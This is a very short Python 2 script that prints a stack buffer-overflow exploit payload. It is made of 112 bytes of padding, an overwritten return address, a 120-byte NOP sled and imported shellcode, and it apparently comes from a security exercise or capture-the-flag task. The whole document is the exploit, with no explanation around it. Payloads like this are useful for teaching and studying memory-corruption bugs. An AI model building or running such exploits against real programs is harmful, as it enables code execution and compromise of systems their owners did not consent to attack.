from shellcode import shellcode

print "A" * 112 + "\xc8\xd1\xfe\xbf" + "\x90" * 120 + shellcode
